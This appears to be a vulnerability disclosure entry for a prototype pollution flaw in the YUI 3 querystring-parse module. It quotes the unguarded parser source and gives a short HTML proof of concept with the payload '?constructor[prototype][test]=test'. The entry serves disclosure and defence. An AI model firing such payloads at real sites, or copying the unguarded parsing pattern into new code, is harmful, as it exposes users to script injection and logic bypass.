## YUI 3: Yahoo User Interface Library querystring-parse

URL: https://clarle.github.io/yui3/

### Vulnerable code fragment

https://github.com/yui/yui3/blob/25264e3629b1c07fb779d203c4a25c0879ec862c/src/querystring/js/querystring-parse.js#L47-L91

```js
pieceParser = function (eq) {
    return function parsePiece (key, val) {

        var sliced, numVal, head, tail, ret;

        if (arguments.length !== 2) {
            // key=val, called from the map/reduce
            key = key.split(eq);
            return parsePiece(
                QueryString.unescape(key.shift()),
                QueryString.unescape(key.join(eq))
            );
        }
        key = key.replace(/^\s+|\s+$/g, '');
        if (Y.Lang.isString(val)) {
            val = val.replace(/^\s+|\s+$/g, '');
            // convert numerals to numbers
            if (!isNaN(val)) {
                numVal = +val;
                if (val === numVal.toString(10)) {
                    val = numVal;
                }
            }
        }
        sliced = /(.*)\[([^\]]*)\]$/.exec(key);
        if (!sliced) {
            ret = {};
            if (key) {
                ret[key] = val;
            }
            return ret;
        }
        // ["foo[][bar][][baz]", "foo[][bar][]", "baz"]
        tail = sliced[2];
        head = sliced[1];

        // array: key[]=val
        if (!tail) {
            return parsePiece(head, [val]);
        }

        // obj: key[subkey]=val
        ret = {};
        ret[tail] = val;
        return parsePiece(head, ret);
    };
},         
```

### PoC
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/yui/3.18.1/yui/yui-min.js"></script>
<script>
YUI().use('querystring', function (Y) {
    Y.QueryString.parse(location.search.slice(1));
});
</script>
```
```
?constructor[prototype][test]=test
```